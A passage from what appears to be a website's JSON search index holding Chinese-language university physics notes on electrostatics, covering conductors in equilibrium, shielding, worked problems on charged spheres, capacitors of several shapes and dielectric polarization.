\u8d1f\u503c</p>"},{"location":"Courses/Physics/PhysicsII/electricity/#_7","title":"\u9759\u7535\u573a\u4e2d\u7684\u91d1\u5c5e\u5bfc\u4f53","text":""},{"location":"Courses/Physics/PhysicsII/electricity/#_8","title":"\u9759\u7535\u5e73\u8861","text":"<p>\u5916\u7535\u573a\u5f15\u8d77\u5bfc\u4f53\u4e0a\u81ea\u7531\u7535\u5b50\u7684\u79fb\u52a8\uff0c\u4f7f\u5bfc\u4f53\u5e26\u4e0a\u7b49\u91cf\u5f02\u53f7\u7684\u611f\u5e94\u7535\u8377\u3002\u611f\u5e94\u7535\u8377\u6fc0\u53d1\u9644\u52a0\u7535\u573a\uff0c\u6539\u53d8\u5bfc\u4f53\u5185\u5916\u7684\u7535\u573a\u3002\u5f53\u5bfc\u4f53\u5185\u7684\u5916\u7535\u573a\u4e0e\u9644\u52a0\u7535\u573a\u6b63\u597d\u76f8\u4e92\u62b5\u6d88\u65f6\uff0c\u5bfc\u4f53\u4e0a\u7684\u81ea\u7531\u7535\u5b50\u505c\u6b62\u5b8f\u89c2\u8fd0\u52a8\uff0c\u5bfc\u4f53\u8fbe\u5230\u9759\u7535\u5e73\u8861\u3002</p> <p>\u9759\u7535\u5e73\u8861\u7684\u7279\u70b9\uff1a</p> <ul> <li>\u573a\u5f3a\u4e0e\u7535\u52bf<ul> <li>\u5bfc\u4f53\u5185\u90e8\u573a\u5f3a\u5904\u5904\u4e3a 0\uff0c\u4e14\u8868\u9762\u5916\u4fa7\u7d27\u9760\u8868\u9762\u5904\u7684\u573a\u5f3a\u5904\u5904\u4e0e\u8868\u9762\u5782\u76f4</li> <li>\u5bfc\u4f53\u662f\u4e00\u4e2a\u7b49\u52bf\u4f53\uff0c\u5bfc\u4f53\u8868\u9762\u662f\u4e00\u4e2a\u7b49\u52bf\u9762</li> </ul> </li> <li>\u7535\u8377\u5206\u5e03<ul> <li>\u7535\u8377\u53ea\u5206\u5e03\u5728\u5bfc\u4f53\u7684\u8868\u9762\u4e0a</li> <li>\u5bfc\u4f53\u4e0a\u6240\u6709\u7535\u8377\u7684\u4ee3\u6570\u548c\u4e0d\u53d8</li> <li>\u5bfc\u4f53\u8868\u9762\u573a\u5f3a\u4e0e\u7535\u8377\u9762\u5bc6\u5ea6\u7684\u5173\u7cfb\uff1a \\(E=\\frac{\\sigma}{\\varepsilon_0}\\)</li> <li>\u5b64\u7acb\u5bfc\u4f53\u66f2\u7387\u8d8a\u5927\u7684\u5730\u65b9\uff0c\u7535\u8377\u9762\u5bc6\u5ea6\u8d8a\u5927</li> </ul> </li> </ul> \u5386\u5e74\u5377\u4e2d\u6ca1\u60f3\u5230\u7684\u4e00\u9898 \u9898\u9762\u7b54\u6848 <p>\u4e24\u4e2a\u534a\u5f84\u5404\u4e3a a \u548c b \u7684\u91d1\u5c5e\u7403\u901a\u8fc7\u7ec6\u5bfc\u7ebf\u76f8\u8fde\uff0c\u5b83\u4eec\u95f4\u7684\u8ddd\u79bb\u6bd4\u81ea\u8eab\u7ebf\u5ea6\u5927\u5f97\u591a\u3002\u5982\u679c\u6b64\u7cfb\u7edf\u5e26\u4e0a\u7535\u8377 \\(Q\\)\uff0c\u5219\u4e24\u4e2a\u91d1\u5c5e\u7403\u5404\u5e26\u7535\u8377\u591a\u5c11\uff1f</p> <p>\u4e00\u5f00\u59cb\u4ee5\u4e3a\u662f\u7535\u8377\u8981\u5e73\u8861\uff0c\u89c9\u5f97\u662f\u5bf9\u534a\u5206\u4e86...</p> <p>\u5b9e\u9645\u4e0a\u662f\u7535\u52bf\u5e73\u8861\uff0c\u5e76\u4e14\u7535\u8377\u91cf\u548c\u4e0d\u53d8\uff0c\u5219\u6709 \\(\\frac{Q_a}{4\\pi \\varepsilon_0 a}=\\frac{ Q_b}{4\\pi \\varepsilon_0 b},Q_a + Q_b = Q\\)</p> <p>\u6240\u4ee5 \\(Q_a = \\frac{a}{a+b}Q,Q_b =\\frac{b}{a+b}Q\\)</p> \u53c8\u683d\u5728\u540c\u4e00\u4e2a\u95ee\u9898\u4e0a\u9762\u4e86... <p>[\u9898\u9762] \u4e24\u4e2a\u540c\u5fc3\u91d1\u5c5e\u7403\u58f3\uff0c\u534a\u5f84\u5206\u522b\u4e3a \\(R_2\\) \u548c \\(R_1\\) (\\(R_2 \\gt R_1\\))\uff0c\u82e5\u5206\u522b\u5e26\u7535\u8377 \\(q_1, q_2\\) \u3002\u73b0\u7528\u5bfc\u7ebf\u5c06\u4e24\u7403\u58f3\u76f8\u8fde\uff0c\u5219\u5b83\u4eec\u7684\u7535\u52bf\u4e3a\uff1f</p> <p>[\u89e3\u7b54] \u4e0e\u4e0a\u9762\u90a3\u9898\u4e0d\u540c\uff0c\u8fd9\u91cc\u4e24\u4e2a\u7403\u58f3\u540c\u5fc3\uff0c\u90a3\u4e48\u6b64\u65f6\u5c06\u5b83\u4eec\u76f8\u8fde\uff0c\u7535\u8377\u90fd\u4f1a\u8f6c\u79fb\u5230\u5916\u9762\u90a3\u4e2a\u7403\u58f3\u4e0a\u9762\uff0c\u6b64\u65f6\u7535\u52bf\u4e3a \\(\\frac{q_1 + q_2}{ 4\\pi \\varepsilon_0 R_2}\\)</p>"},{"location":"Courses/Physics/PhysicsII/electricity/#_9","title":"\u9759\u7535\u5c4f\u853d","text":"<p>\u4e00\u4e2a\u7a7a\u8154\u5bfc\u4f53\u4f4d\u4e8e\u5916\u7535\u573a\u4e2d\uff0c\u7a7a\u8154\u5185\u573a\u5f3a\u5904\u5904\u4e3a 0 \uff0c\u8fd9\u65f6\u7a7a\u8154\u5185\u7684\u7269\u4f53\u6216\u4eea\u5668\u4e0d\u4f1a\u53d7\u5916\u7535\u573a\u5f71\u54cd\uff0c\u8fd9\u5c31\u662f\u6240\u8c13\u7684\u9759\u7535\u5c4f\u853d\u539f\u7406\u3002</p> <p>\u7a7a\u8154\u5bfc\u4f53\u5916\u8868\u9762\u548c\u5185\u8868\u9762\u7535\u8377\u5bf9\u4e8e\u5185\u90e8\u7684\u7535\u52bf\u5904\u5904\u76f8\u7b49</p> <p>\u5f53\u60f3\u8981\u67d0\u4e00\u4eea\u5668\u4e0d\u53d7\u5916\u7535\u573a\u5f71\u54cd\uff0c\u53ef\u4ee5\u7528\u4e00\u4e2a\u91d1\u5c5e\u7f69\u628a\u5b83\u5305\u56f4\u8d77\u6765\uff0c\u901a\u5e38\u4f7f\u7528\u8f83\u5bc6\u7684\u91d1\u5c5e\u7f51\u5c31\u80fd\u8d77\u5230\u8f83\u597d\u7684\u5c4f\u853d\u4f5c\u7528</p> <p>\u76f8\u5bf9\u7684\uff0c\u5982\u679c\u5c06\u5916\u8868\u9762\u63a5\u5730\uff0c\u7a7a\u8154\u5185\u90e8\u653e\u7f6e\u4e00\u7535\u8377\uff0c\u5219\u53ef\u89c6\u4e3a\u5916\u90e8\u5bf9\u5185\u90e8\u9759\u7535\u5c4f\u853d\u3002\u5373\uff0c\u5185\u90e8\u7535\u8377\u7684\u7535\u573a\u4e0d\u4f1a\u5f71\u54cd\u5916\u90e8</p> <p></p> <p>\u4e0a\u56fe\u53ef\u8bf4\u660e\uff0c\u8154\u5185\u7535\u8377 A \u53ef\u6fc0\u53d1\u5bfc\u4f53\u5185\u5916\u8868\u9762\u7684\u7535\u8377\uff0c\u4f46\u8154\u5185\u7535\u8377\u4f4d\u7f6e\u4e0d\u80fd\u6539\u53d8\u5bfc\u4f53\u5916\u8868\u9762\u7535\u8377\u7684\u5206\u5e03\uff1b\u82e5\u5bfc\u4f53\u5916\u8868\u9762\u63a5\u5730\uff0c\u8154\u5185\u7535\u8377 A \u4e0d\u4f1a\u5bf9\u5bfc\u4f53\u5916\u7684\u7269\u4f53\u4ea7\u751f\u5f71\u54cd</p> <p>(23-24 \u671f\u4e2d) \u9009\u62e9\u9898</p> <ul> <li>C. \u5185\u90e8\u65e0\u5176\u5b83\u5bfc\u4f53\u7684\u7a7a\u8154\u5e26\u7535\u5bfc\u4f53\uff0c\u4e0d\u7ba1\u5b83\u662f\u5426\u5904\u4e8e\u5916\u7535\u573a\u4e2d\uff0c\u7535\u8377\u603b\u662f\u5206\u5e03\u5728\u5185\u3001\u5916\u8868\u9762\u4e0a</li> </ul> <p>\u8fd9\u4e2a\u8bba\u65ad\u662f\u9519\u8bef\u7684\uff0c\u9759\u7535\u5e73\u8861\u7684\u95ee\u9898\u80cc\u666f\u5728\u4e8e\u5b58\u5728\u5916\u7535\u573a\u65f6\uff1b\u82e5\u5bfc\u4f53\u5916\u90e8\u4e0d\u65bd\u52a0\u5916\u7535\u573a\uff0c\u90a3\u4e48\u7535\u8377\u5c31\u4e0d\u4e00\u5b9a\u53ea\u5728\u5185\u5916\u8868\u9762\uff0c\u8fd8\u53ef\u80fd\u5b58\u5728\u4e8e\u5185\u90e8\u4e86\u3002</p>"},{"location":"Courses/Physics/PhysicsII/electricity/#_10","title":"\u4f8b\u9898","text":""},{"location":"Courses/Physics/PhysicsII/electricity/#_11","title":"\u8ba8\u8bba\u9898\uff1a\u9759\u7535\u573a\u4e2d\u7684\u5bfc\u4f53","text":"<p>\u6709\u4e24\u4e2a\u5e26\u6b63\u7535\u7684\u5c0f\u7403 A,B \uff0c\u5176\u4e2d\u5c0f\u7403 A \u6240\u5e26\u7535\u8377\u8fdc\u5c0f\u4e8e\u5c0f\u7403 B</p> \u91d1\u5c5e\u7403\u58f3\u5185\u653e\u7f6e\u5c0f\u7403 B\u91d1\u5c5e\u7403\u58f3\u5185\u4e0d\u653e\u7f6e\u5c0f\u7403\u7403 B \u4e0e\u91d1\u5c5e\u7403\u58f3\u5185\u8868\u9762\u63a5\u89e6\u91d1\u5c5e\u7403\u58f3\u63a5\u5730 <p> \u7403 B \u5728\u5185\u8868\u9762\u611f\u5e94\u7535\u8377 \\(-q_2\\) \uff0c\u5916\u8868\u9762\u4ea7\u751f\u611f\u5e94\u7535\u8377 \\(+q_2\\) \uff0c\u4e14\u7403 B \u4e0e\u5185\u8868\u9762\u5bf9\u5916\u4ea7\u751f\u7684\u7535\u573a\u5b8c\u5168\u62b5\u6d88\uff0c\u6545\u7403 A \u6536\u5230\u7403\u58f3\u5916\u8868\u9762\u5bf9\u5b83\u7684\u65a5\u529b</p> <p> \u5728\u7403\u58f3\u5916\u8868\u9762\u51fa\u73b0\u611f\u5e94\u7535\u8377\uff0c\u603b\u7535\u8377\u867d\u4e3a 0\uff0c\u4f46\u8d1f\u7535\u8377\u9760\u8fd1 A \u7403\uff0c\u6545\u603b\u4f53\u53d7\u5438\u5f15\u529b</p> <p> \u7403 B \u4e0e\u7403\u58f3\u6784\u6210\u4e00\u4f53\uff0c\u6240\u5e26\u7535\u8377\u5168\u90e8\u8f6c\u79fb\u81f3\u7403\u58f3\u5916\u8868\u9762</p> <p> \u63a5\u5730\u7403\u58f3\u7535\u52bf\u4e3a 0\uff0c\u7403\u58f3\u8868\u9762\u7684\u6b63\u611f\u5e94\u7535\u8377\u548c\u5927\u5730\u4e2d\u548c\uff0c\u53ea\u5269\u4e0b\u8d1f\u611f\u751f\u7535\u8377</p>"},{"location":"Courses/Physics/PhysicsII/electricity/#10-1","title":"\u6559\u6750\u4f8b\u9898 10-1","text":"<p>\u4e00\u5757\u9762\u79ef\u4e3a S \u7684\u91d1\u5c5e\u5927\u8584\u5e73\u677f A \uff0c\u5e26\u7535\u91cf\u4e3a \\(Q\\) \uff0c\u5728\u5176\u9644\u8fd1\u5e73\u884c\u653e\u7f6e\u53e6\u4e00\u5757\u4e0d\u5e26\u7535\u7684\u91d1\u5c5e\u5927\u8584\u5e73\u677f B \uff0c\u4e24\u677f\u95f4\u8ddd\u8fdc\u5c0f\u4e8e\u677f\u7684\u7ebf\u5ea6\u3002\u8bd5\u6c42\u4e24\u677f\u8868\u9762\u7684\u7535\u8377\u9762\u5bc6\u5ea6\uff0c\u4ee5\u53ca\u5468\u56f4\u7a7a\u95f4\u7684\u573a\u5f3a\u5206\u5e03\u3002</p> <p>\u89e3\u7b54\uff1a</p> <p>\u4e24\u677f\u95f4\u8ddd\u8fdc\u5c0f\u4e8e\u677f\u7684\u7ebf\u5ea6\uff0c\u56e0\u6b64\u53ef\u89c6\u4e24\u677f\u4e3a\u65e0\u9650\u5927\u5e73\u9762\uff0c\u4e14\u5176\u8868\u9762\u7535\u8377\u5747\u5300\u5206\u5e03\uff0c\u8bbe\u4ece\u5de6\u5230\u53f3\u56db\u4e2a\u9762\u7535\u8377\u9762\u5bc6\u5ea6\u4e3a \\(\\sigma_1\\),\\(\\sigma_2\\),\\(\\sigma_3\\),\\(\\sigma_4\\) \uff0c\u5219\u6839\u636e\u9ad8\u65af\u5b9a\u7406\uff0c\u7531\u67d0\u4e2a\u5e73\u9762\u4ea7\u751f\u7684\u7535\u573a\u5f3a\u5ea6\u4e3a \\(E=\\frac{\\sigma}{2\\varepsilon_0}\\) \uff0c\u89c4\u5b9a\u5411\u53f3\u4e3a\u6b63\uff0c\u5411\u5de6\u4e3a\u8d1f</p> <p>\u6839\u636e\u7535\u8377\u5b88\u6052\uff0c\u6709\uff1a</p> \\[ \\sigma_1 +\\sigma_2 = \\frac{Q}{S},\\sigma_3 +\\sigma_4 = 0 \\] <p>\u6839\u636e\u9759\u7535\u5e73\u8861\uff0c\u4e24\u4e2a\u5bfc\u4f53\u5185\u90e8\u573a\u5f3a\u5747\u4e3a 0\uff0c\u7528\u573a\u5f3a\u53e0\u52a0\u539f\u7406\u8ba1\u7b97\u4e24\u5904\u7684\u573a\u5f3a\uff1a</p> \\[\\begin{gather} P_A : \\frac{\\sigma_1}{2\\varepsilon_0} -\\frac{\\sigma_2}{2\\varepsilon_0} -\\frac{\\sigma_3}{2\\varepsilon_0} -\\frac{\\sigma_4}{2\\varepsilon_0} =0  \\\\ P_B: \\frac{\\sigma_1}{2\\varepsilon_0} +\\frac{\\sigma_2}{2\\varepsilon_0} +\\frac{\\sigma_3}{2\\varepsilon_0} -\\frac{\\sigma_4}{2\\varepsilon_0} =0 \\end{gather} \\] <p>\u8054\u7acb\u4e0a\u9762\u56db\u5f0f\uff0c\u89e3\u5f97 \\(\\sigma_1 =\\sigma_2 =\\sigma_4 =\\frac{Q}{2S},\\sigma_3 = -\\frac{Q}{2S}\\)</p> <p>\u518d\u6839\u636e\u573a\u5f3a\u53e0\u52a0\u5373\u53ef\u6c42\u51fa \\(E_1\\),\\(E_2\\),\\(E_3\\)</p>"},{"location":"Courses/Physics/PhysicsII/electricity/#_12","title":"\u6c42\u7403\u58f3\u7535\u52bf","text":"<p>\u5728\u5185\u5916\u534a\u5f84\u5206\u522b\u4e3a \\(R_1\\) \u548c \\(R_2\\) \u7684\u5bfc\u4f53\u7403\u58f3\u5185\uff0c\u6709\u4e00\u4e2a\u534a\u5f84\u4e3a \\(r\\) \u7684\u5bfc\u4f53\u5c0f\u7403\uff0c\u5c0f\u7403\u4e0e\u7403\u58f3\u540c\u5fc3\uff0c\u5206\u522b\u5e26\u7535\u8377\u91cf \\(q\\) \u548c \\(Q\\) \uff0c\u6c42\u5c0f\u7403\u7684\u7535\u52bf \\(U_r\\) \u4ee5\u53ca\u7403\u58f3\u5185\u5916\u8868\u9762\u7535\u52bf \\(U_{ R_1}\\) \u548c \\(U_{R _2}\\)</p> <p>\u89e3\u7b54\uff1a</p> <p>\u5c0f\u7403\u5728\u7403\u58f3\u5185\u8868\u9762\u611f\u5e94\u51fa\u7535\u8377 \\(-q\\) \uff0c\u5219\u7403\u58f3\u5916\u8868\u9762\u603b\u7535\u8377\u4e3a \\(Q+q\\) \uff0c\u90a3\u4e48\u6839\u636e\u7535\u52bf\u53e0\u52a0\u539f\u7406\uff1a</p> \\[\\begin{array}c U_r = \\frac{1}{4\\pi \\varepsilon_0}\\left( \\frac{q}{r} -\\frac{q}{{R_1}}+ \\frac{Q+q}{R_2}\\right)\\\\ U_ {R_1} =\\frac{1}{4\\pi \\varepsilon_0}\\left( \\frac{q}{R_1} - \\frac{q}{R_1} + \\frac{Q+q}{R_2}\\right)= \\frac{1}{4\\pi \\varepsilon_0}\\frac{Q+q}{R _2} \\\\ U_{R _2} =\\frac{1}{4\\pi \\varepsilon_0}\\left( \\frac{q}{R_1} - \\frac{q}{R_1} + \\frac{Q+q}{R_2}\\right)= \\frac{1}{4\\pi \\varepsilon_0}\\frac{Q+q}{R _2} \\end{array}\\] <p>\u5173\u4e8e\u4e3a\u4ec0\u4e48\u7403\u58f3\u5185\u8868\u9762\u5728\u5c0f\u7403\u5904\u4ea7\u751f\u7684\u7535\u52bf\u4e3a \\(\\frac{q}{R_1}\\) \uff0c\u8fd9\u662f\u56e0\u4e3a\u7403\u58f3\u8868\u9762\u5bf9\u5176\u5185\u90e8\u4ea7\u751f\u7684\u7535\u52bf\u5904\u5904\u76f8\u7b49\uff0c\u56e0\u6b64\u5c0f\u7403\u5904\u7535\u52bf\u7b49\u4e8e\u5185\u8868\u9762 \\(R_1\\) \u5904\u7535\u52bf \uff08\u9ad8\u4e2d\u5b66\u8fc7\uff0c\u5373\u5e26\u7535\u7403\u58f3\u5185\u90e8\u7535\u52bf\u5904\u5904\u76f8\u7b49\uff0c\u5916\u90e8\u5219\u5c06\u5b83\u770b\u4f5c\u5e26\u7535\u5c0f\u7403\uff09</p>"},{"location":"Courses/Physics/PhysicsII/electricity/#_13","title":"\u7535\u5bb9\u5668","text":"<p>\u4e24\u4e2a\u5e26\u6709\u7b49\u91cf\u5f02\u53f7\u7535\u8377\u7684\u5bfc\u4f53\u7ec4\u6210\u7684\u7535\u5bb9\u5668\uff0c\u5176\u7535\u5bb9\u5b9a\u4e49\u4e3a\uff1a</p> \\[ C=\\frac{Q}{U_A - U_B} \\] <p>\u5355\u4f4d\u4e3a\u6cd5\u62c9 (F)</p> <p>\u5f53 n \u4e2a\u7535\u5bb9\u8fdb\u884c\u4e32\u8054\uff0c\u5176\u80fd\u627f\u53d7\u7684\u603b\u7535\u8377\u4e0d\u53d8\uff0c\u4f46\u662f\u603b\u7535\u52bf\u5dee\u503c \\(U_A - U_B = U_1 +U_2 +...+U_n\\)</p> <p>\u90a3\u4e48\u5176\u7b49\u6548\u7535\u5bb9\u6709\u7b49\u5f0f\uff1a</p> \\[ \\frac{1}{C} = \\frac{U_A - U_B}{Q} = \\frac{U_1 +U_2 +...+U_n}{Q}=\\frac{1}{C_1} +\\frac{1}{C_2} +..+\\frac{1}{C_n} \\] <p>\u76f8\u6bd4\u4e8e\u5355\u4e2a\u7535\u5bb9\uff0c\u4e32\u8054\u8d77\u6765\u5176\u7b49\u6548\u7535\u5bb9\u51cf\u5c11\uff0c\u8010\u538b\u589e\u52a0</p> <p>\u5f53 n \u4e2a\u7535\u5bb9\u8fdb\u884c\u5e76\u8054\uff0c\u76f8\u5e94\u7535\u91cf \\(Q=q_1 +q_2 +...+q_n\\) \uff0c\u7535\u52bf\u5dee\u503c\u4e0d\u53d8</p> <p>\u90a3\u4e48\u5176\u7b49\u6548\u7535\u5bb9\u7b49\u5f0f\uff1a</p> \\[ C=\\frac{Q}{U_A -U_B} =\\frac{q_1 +q_2 +...+q_n}{U_A -U_B} =C_1 +C_2 +...+C_n \\] <p>\u76f8\u6bd4\u4e8e\u5355\u4e2a\u7535\u5bb9\uff0c\u5e76\u8054\u589e\u52a0\u603b\u7535\u5bb9\uff0c\u800c\u8010\u538b\u503c\u7b49\u4e8e\u5e76\u8054\u7535\u5bb9\u4e2d\u6700\u4f4e\u7684\u8010\u538b\u503c</p> <p>\u7535\u5bb9\u5668\u4e32\u8054\uff0c\u5404\u4e2a\u7535\u5bb9\u5668\u7684\u7535\u8377\u91cf\u76f8\u540c</p> <p>(D) \u4e24\u4e2a\u5b8c\u5168\u76f8\u540c\u7684\u7535\u5bb9\u5668\u4e0e\u7535\u6e90\u4e32\u8054\uff0c\u73b0\u5c06\u4e00\u5404\u5411\u540c\u6027\u7535\u4ecb\u8d28\u63d2\u5165 \\(C_1\\) \u4e4b\u95f4\uff0c\u95ee\uff1a</p> <ul> <li>A. \u7535\u5bb9\u5668\u7ec4\u603b\u7535\u5bb9\u51cf\u5c11</li> <li>B. \\(C_1\\) \u4e0a\u7535\u91cf\u5927\u4e8e \\(C_2\\) \u4e0a\u7535\u91cf</li> <li>C. \\(C_1\\) \u4e0a\u7535\u538b\u5927\u4e8e \\(C_2\\) \u4e0a\u7535\u538b</li> <li>D. \u7535\u5bb9\u5668\u50a8\u5b58\u603b\u80fd\u91cf\u589e\u5927</li> </ul> <p>\u5bf9\u4e8eB,C\uff0c\u7531\u4e8e\u603b\u7535\u538b\u4e0d\u53d8\u3001\u603b\u7535\u5bb9\u589e\u5927\uff0c\u6240\u4ee5\u4e24\u4e2a\u5bc4\u5b58\u5668\u4e0a\u7535\u8377\u91cf\u589e\u5927\uff1b\\(C_2\\) \u4e0d\u53d8\uff0c\u5219 \\(U_2\\) \u589e\u5927\uff0c\u5bf9\u5e94 \\(U_1=U- U_2\\) \u51cf\u5c11\u3002</p>"},{"location":"Courses/Physics/PhysicsII/electricity/#_14","title":"\u5e73\u884c\u677f\u7535\u5bb9\u5668","text":"<p>\u4e24\u677f\u95f4\u7684\u573a\u5f3a\u4e3a </p> \\[ E= \\frac{\\sigma}{\\varepsilon_0} = \\frac{q}{\\varepsilon_0 S} \\] <p>\u6839\u636e\u7535\u5bb9\u5b9a\u4e49\u53ef\u5f97\uff1a</p> \\[ C= \\frac{q}{\\Delta V}= \\frac{q}{Ed}= \\frac{\\varepsilon_0 S}{d} \\] <p>\u4e2d\u95f4\u63d2\u5165\u4ecb\u7535\u5e38\u6570\u4e3a \\(\\varepsilon\\) \u7684\u7535\u4ecb\u8d28\uff0c\u5219 \\(C=\\frac{\\varepsilon_0 \\varepsilon S}{d}\\)</p> <p></p> <p>\u82e5\u4e24\u5e73\u884c\u677f\u4e4b\u95f4\u5145\u6ee1\u4e86\u4e0d\u540c\u957f\u5ea6\u7684\u7535\u4ecb\u8d28\uff08\u4e32\u8054\uff09\uff0c\u5219\u7535\u5bb9\u4e3a\uff1a</p> \\[ C=\\frac{\\varepsilon_0 S}{\\frac{d_1}{\\varepsilon _1} +\\frac{d_2}{\\varepsilon _2} +..+\\frac{d_n}{\\varepsilon _n}} \\] <p>\u4e24\u6781\u677f\u4e4b\u95f4\u7684\u4f5c\u7528\u529b</p> <p>\u4e00\u4e2a\u7a7a\u6c14\u5e73\u677f\u7535\u5bb9\u5668\uff0c\u7535\u5bb9\u4e3a \\(C\\)\uff0c\u4e24\u6781\u677f\u95f4\u8ddd\u79bb\u4e3a \\(d\\)\u3002\u5145\u7535\u540e\uff0c\u4e24\u6781\u677f\u4e4b\u95f4\u4f5c\u7528\u529b\u4e3a \\(F\\)\uff0c\u6c42\u6781\u677f\u4e0a\u7535\u8377\u5927\u5c0f\u3002</p> \\[\\begin{array}c \\begin{cases}E_{\u4e0a}= \\frac{\\sigma}{2\\varepsilon_0}\\\\ F= E_{\u4e0a} Q\\end{cases} \\Rightarrow Q= \\sqrt{2\\varepsilon_0 SF}= \\sqrt{2FdC}\\end{array}\\]"},{"location":"Courses/Physics/PhysicsII/electricity/#_15","title":"\u5706\u67f1\u5f62\u7535\u5bb9\u5668","text":"<p>\u8bbe\u5185\u5916\u67f1\u9762\u7535\u8377\u7ebf\u5bc6\u5ea6\u4e3a \\(+\\lambda\\) \u548c \\(-\\lambda\\) \uff0c\u53d6\u5355\u4f4d\u957f\u5ea6\uff0c\u534a\u5f84\u4f4d\u4e8e\u5185\u5916\u8868\u9762\u4e4b\u95f4\u7684\u5706\u67f1\u9762\u4f5c\u4e3a\u9ad8\u65af\u9762\u5e94\u7528\u9ad8\u65af\u5b9a\u7406\uff1a</p> \\[ E=\\frac{\\lambda}{2\\pi \\varepsilon_0 r} \\] <p>\u90a3\u4e48\u79ef\u5206\u5f97\u5230 </p> \\[\\Delta U =\\int ^{R_B} _{R _A} Edr =\\frac{\\lambda}{2\\pi \\varepsilon_0}\\ln \\frac{R_B} {R_A} \\] <p>\u6839\u636e\u7535\u5bb9\u5b9a\u4e49\u5f97\u5230\uff1a</p> \\[ C= \\frac{Q}{U}=\\frac{2\\pi \\varepsilon_0 l}{\\ln(R_B /R_A)} \\]"},{"location":"Courses/Physics/PhysicsII/electricity/#_16","title":"\u540c\u5fc3\u7403\u5f62\u7535\u5bb9\u5668","text":"<p>\u5916\u8868\u9762\u5bf9\u5185\u5916\u7403\u58f3\u4e4b\u95f4\u4e0d\u4ea7\u751f\u573a\u5f3a\uff0c\u5219\uff1a</p> \\[ E=\\frac{q}{4\\pi \\varepsilon_0 r^2} \\] <p>\u5bf9\u5176\u8fdb\u884c\u79ef\u5206\uff1a</p> \\[ \\Delta U=\\int ^{R_B} _ {R_A} \\frac{q}{4\\pi\\varepsilon_0 r^2} dr =\\frac{q}{4\\pi \\varepsilon_0} ( \\frac{1}{R_A} - \\frac{1}{R_B}) \\] <p>\u6839\u636e\u7535\u5bb9\u5b9a\u4e49\u5f97\u5230\uff1a</p> \\[ C=4\\pi \\varepsilon_0 \\frac{R_A R_B}{(R _B-R _A)} \\] <p>\u82e5 \\(R_B\\) \u8fdc\u5927\u4e8e \\(R_A\\) \uff0c\\(C=4\\pi\\varepsilon_0 R_A\\) \uff0c\u5373\u5185\u58f3\u5b64\u7acb\u5bfc\u4f53\u7403\u7535\u5bb9</p>"},{"location":"Courses/Physics/PhysicsII/electricity/#_17","title":"\u9759\u7535\u573a\u4e2d\u7684\u7535\u4ecb\u8d28","text":""},{"location":"Courses/Physics/PhysicsII/electricity/#_18","title":"\u7535\u4ecb\u8d28\u7684\u6781\u5316","text":"<p>\u539f\u5b50\u7684\u6b63\u8d1f\u7535\u4e2d\u5fc3\u91cd\u5408\uff0c\u6bcf\u4e2a\u539f\u5b50\u7684\u7535\u5076\u6781\u77e9\u4e3a\u96f6\u3002\u51e0\u4e2a\u539f\u5b50\u6784\u6210\u5206\u5b50\u65f6\uff0c\u6b63\u8d1f\u7535\u4e2d\u5fc3\u53ef\u91cd\u5408\uff0c\u53ef\u4e0d\u91cd\u5408\uff0c\u524d\u8005\u79f0\u4e3a\u65e0\u6781\u5206\u5b50\uff0c\u540e\u8005\u79f0\u4e3a\u6709\u6781\u5206\u5b50\u3002</p> <p>\u7535\u5076\u6781\u77e9\u4e3a \\(q\\cdot l\\) \uff0c\u662f\u77e2\u91cf</p> <ul> <li>\u5bf9\u6709\u6781\u5206\u5b50\uff0c\u6b63\u8d1f\u7535\u8377\u4e2d\u5fc3\u7ec4\u6210\u7b49\u6548\u5206\u5b50\u7535\u5076\u6781\u77e9 \\(p\\) \uff0c\u5927\u91cf\u5206\u5b50\u7684\u7b49\u6548\u7535\u5076\u6781\u77e9\u4e4b\u548c \\(\\sum p =0\\) </li> <li>\u5bf9\u65e0\u6781\u5206\u5b50\uff0c\u6709 \\(p=0\\)</li> </ul> <p>\u5916\u7535\u573a\u52a0\u5728\u7535\u4ecb\u8d28\u4e4b\u4e0a\uff0c\u5728\u4e0e\u5916\u7535\u573a\u5782\u76f4\u7684\u8868\u9762\u5c42\u91cc\u4f1a\u51fa\u73b0\u6b63\u8d1f\u7535\u8377\u5c42\uff0c\u8fd9\u4e9b\u7535\u5b50\u4e0d\u80fd\u81ea\u7531\u79fb\u52a8\uff0c\u79f0\u4e3a\u675f\u7f1a\u7535\u8377\u6216\u6781\u5316\u7535\u8377\uff0c\u8fd9\u79cd\u73b0\u8c61\u79f0\u4e3a\u7535\u4ecb\u8d28\u7684\u6781\u5316\u3002</p> <p>\u65e0\u6781\u5206\u5b50\u7684\u6781\u5316\u79f0\u4e3a\u4f4d\u79fb\u6781\u5316\uff0c\u6709\u6781\u5206\u5b50\u7684\u6781\u5316\u79f0\u4e3a\u53d6\u5411\u6781\u5316</p> <p>\u5373\u4e00\u4e2a\u901a\u8fc7\u4f4d\u79fb\u5f62\u6210\u7684\u675f\u7f1a\u7535\u8377\uff0c\u4e00\u4e2a\u901a\u8fc7\u65cb\u8f6c\u5f62\u6210\u7684\u675f\u7f1a\u7535\u8377</p> <p>\u7535\u6781\u5316\u5f3a\u5ea6\u77e2\u91cf\u662f\u5355\u4f4d\u4f53\u79ef\u5185\u5206\u5b50\u7535\u5076\u6781\u77e9\u7684\u5f0f\u91cf\u548c\uff1a</p> \\[ \\overrightarrow{P}=\\frac{ \\overrightarrow{p}}{\\Delta V} \\] <p>\u5b9e\u9a8c\u8868\u660e\uff0c\u5bf9\u5927\u591a\u6570\u5404\u5411\u540c\u6027\u7535\u4ecb\u8d28\uff1a \\(\\overrightarrow{P}= \\chi_e \\varepsilon_0 \\overrightarrow{E}\\) \uff0c\u5f0f\u4e2d \\(\\chi_e\\) \u79f0\u4e3a\u4ecb\u8d28\u7684\u7535\u6781\u5316\u7387</p> <p>\u6781\u5316\u7535\u8377\u9762\u5bc6\u5ea6</p> <p>\u5747\u5300\u7535\u4ecb\u8d28\u6781\u5316\u65f6\uff0c\u7535\u4ecb\u8d28\u8868\u9762\u4e0a\u67d0\u70b9\u5904\u7684\u6781\u5316\u7535\u8377\u9762\u5bc6\u5ea6\u03c3\u2032 \u7b49\u4e8e\u6781\u5316\u5f3a\u5ea6\u5728\u8be5\u70b9\u8868\u9762\u7684\u6cd5\u5411\u5206\u91cf</p> \\[\\sigma^\\prime =\\overrightarrow{P}\\cdot \\overrightarrow{e_n}\\] 